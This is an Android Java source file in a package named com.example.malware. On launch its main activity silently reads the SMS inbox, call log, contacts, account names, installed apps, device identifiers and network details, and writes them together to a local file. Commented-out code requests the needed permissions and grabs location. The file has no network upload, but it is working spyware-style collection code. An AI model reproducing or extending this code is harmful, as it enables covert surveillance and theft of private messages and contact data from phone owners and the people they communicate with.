package com.example.malware;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        //askForPermissions();
        String sms = (getSms());
        String net = (getNetwork());
        String verDet = (getVersionDetails());//doesn't need
        String apps = (getAllApps());//doesn't need
        String googleAccounts = (getGoogleAccount());
        String contacts = (getPhoneContacts());
        String calls = (getCallLog());
//        String phoneNumbers = getMyPhoneNumber();

        String s = "SMS:\n" + sms + "\n" + net + "\n" + verDet + "\nAPPLICATIONS:\n" + apps + "\nGOOGLE ACCOUNTS:\n" + googleAccounts + "\nPHONE CONTACTS\n"+ contacts + "\nCALLS:\n" + calls;
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();


        try {
            writeToFile(s, this);
            Toast.makeText(this, "GOOOOOOOOD", Toast.LENGTH_LONG).show();
        } catch (IOException e) {
            e.printStackTrace();
        }

        
    }


    private void writeToFile(String data, Context context) throws IOException {
        Toast.makeText(context, "WRITE TO FILE", Toast.LENGTH_SHORT).show();
        File path = context.getFilesDir();
        File file = new File(path, "information.txt");
        Toast.makeText(context, file.getPath(), Toast.LENGTH_SHORT).show();
        FileOutputStream stream = new FileOutputStream(file);
        try {
            stream.write(data.getBytes());

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            stream.close();
        }
    }

    private static String listToString(List<String> strings) {
        String st = "";
        for (int i = 0; i < strings.size() - 1; i++) {
            st += strings.get(i) + "\n";
        }

        if (strings.size() == 0)
            return "\n";

        return st;
    }

    private String getSms() {
        List<String> sms = new ArrayList<>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = this.getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndexOrThrow("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String s = ("Number: " + address + " .Message: " + body);
            sms.add(s);

        }
        if (cur != null) {
            cur.close();
        }

        Toast.makeText(this, "SMS", Toast.LENGTH_SHORT).show();
        return listToString(sms);
    }

    private String getNetwork() {
        ConnectivityManager connectivityManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        String st = "Network Information:\n";
        if (networkInfo.isConnected()) {
            st += "The Wi-Fi is connected";
        } else {
            st += "The Wi-Fi is not connected";
        }
        st += "\n";

        WifiManager wifiManager = (WifiManager) this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = wifiManager.getConnectionInfo();
        st += "Network Name: " + info.getSSID() + "\n";
        st += "BSSID: " + info.getBSSID() + "\n";
        st += "Network ID: " + info.getNetworkId() + "\n";
        //st += "MAC Address: " + info.getMacAddress() + "\n";
        st += "Describe Contents: " + info.describeContents() + "\n";
        st += "IPv4: " + getIPAddress(true) + "\n";
        st += "IPv6: " + getIPAddress(false) + "\n";
        Toast.makeText(this, "NETWORK", Toast.LENGTH_SHORT).show();
        return st;
    }


    private static String getIPAddress(boolean useIPv4) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        boolean isIPv4 = sAddr.indexOf(':') < 0;

                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
                                return delim < 0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        } // for now eat exceptions
        return "";
    }

    private String getVersionDetails() {
        String st = "DEVICE DETAILS:\n";
        st += "ID: " + Build.ID + "\n";
        st += "Model: " + Build.MODEL + "\n";
        st += "Serial: " + Build.SERIAL + "\n";
        st += "Hardware: " + Build.HARDWARE + "\n";
        st += "OS version :" + System.getProperty("os.version") + "\n";
        st += "User: " + Build.USER + "\n";
        st += "Host: " + Build.HOST + "\n";
        st += "Product " + Build.PRODUCT + "\n";
        st += "Device: " + Build.DEVICE + "\n";
        st += "SDK Version: " + Build.VERSION.SDK_INT;
        st += "Radio Version: " + Build.getRadioVersion() + "\n";
        st += "Brand: " + Build.BRAND + "\n";
        st += "Display: " + Build.DISPLAY + "\n";
        st += "Bootloader: " + Build.BOOTLOADER + "\n";
        st += "Manufacturer: " + Build.MANUFACTURER + "\n";
        st += "Version Release: " + Build.VERSION.RELEASE + "\n";
        Toast.makeText(this, "VERSION", Toast.LENGTH_SHORT).show();
        return st;
    }


    private String getCallLog() {
        List<String> calls = new ArrayList<>();
        Uri allCalls = Uri.parse("content://call_log/calls");
        Cursor c = this.getContentResolver().query(allCalls, null, null, null, null);
        while (c != null && c.moveToNext()) {
            String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
            String name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
            String duration = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
            String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
            calls.add("NUMBER: " + num + " NAME: " + name + " DURATION: " + duration + " TYPE: " + type);
        }
        if (c != null) {
            c.close();
        }
        Toast.makeText(this, "CALL LOG", Toast.LENGTH_SHORT).show();
        return listToString(calls);
    }

    private String getAllApps() {
        List<PackageInfo> packList = this.getPackageManager().getInstalledPackages(0);
        List<String> apps = new ArrayList<>();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            apps.add(packInfo.applicationInfo.loadLabel(this.getPackageManager()).toString());

        }
        Toast.makeText(this, "APPS", Toast.LENGTH_SHORT).show();
        return listToString(apps);
    }

    private String getGoogleAccount() {
        AccountManager manager = (AccountManager) this.getSystemService(Context.ACCOUNT_SERVICE);
        Account[] list = manager.getAccounts();
        List<String> accounts = new ArrayList<>();


        for (int i = 0; i < list.length; i++) {
            accounts.add(list[i].name);
            accounts.add(list[i].toString());
        }
        Toast.makeText(this, "GOOGLE ACCOUNTS", Toast.LENGTH_SHORT).show();
        return listToString(accounts);
    }

    private String getPhoneContacts() {
        ContentResolver contentResolver = this.getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        Cursor cursor = contentResolver.query(uri, null, null, null, null);



        //Log.i("CONTACT_PROVIDER_DEMO", "TOTAL # OF CONTACTS ::: " + Integer.toString(cursor.getCount()));
        List<String> contacts = new ArrayList<>();
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String contactName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String contactNumber = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                contacts.add("CONTACT NAME: " + contactName + " ::: CONTACT PHONE NUMBER: " + contactNumber);
            }
        }
        Toast.makeText(this, "PHONE CONTACTS", Toast.LENGTH_SHORT).show();
        return listToString(contacts);
    }





    /*private boolean hasReadContactsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasGetAccountsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasReadSmsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasReadCallLogPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasReadPhoneState() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
    }

    private void askForPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        if (!hasReadContactsPermission()) {
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS);
        }
        if (!hasGetAccountsPermission()) {
            permissionsToRequest.add(Manifest.permission.GET_ACCOUNTS);
        }
        if (!hasReadSmsPermission()) {
            permissionsToRequest.add(Manifest.permission.READ_SMS);
        }
        if (!hasReadCallLogPermission()) {
            permissionsToRequest.add(Manifest.permission.READ_CALL_LOG);
        }
        if (!hasReadPhoneState()) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (permissionsToRequest.size() > 0) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), 0);
        }
        Toast.makeText(this, "Good job you did it!", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 0 && grantResults.length > 0) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("PermissionRequest", "vdfv");
                }
            }
        }
    }






//    private void getLocation() {
//        fusedLocationProviderClient.getLastLocation().addOnSuccessListener(this, new OnSuccessListener<Location>() {
//            @Override
//            public void onSuccess(Location location) {
//                if (location != null) {
//                    String st = "LOCATION:\n";
//                    st += "Longitude: " + location.getLongitude() + "\n";
//                    st += "Altitude: " + location.getAltitude() + "\n";
//                    st += "Accuracy: " + location.getAccuracy() + "\n";
//                    st += "Bearing: " + location.getBearing() + "\n";
//                    st += "Latitude: " + location.getLatitude() + "\n";
//                    st += "Speed: " + location.getSpeed() + "\n\n";
//                    try {
//                        writeToFile(st, MainActivity.this);
//                        Toast.makeText(MainActivity.this, "location2", Toast.LENGTH_SHORT).show();
//                    } catch (IOException e) {
//                        e.printStackTrace();
//                    }
//
//                }
//            }
//        });
//
//    }



    */
}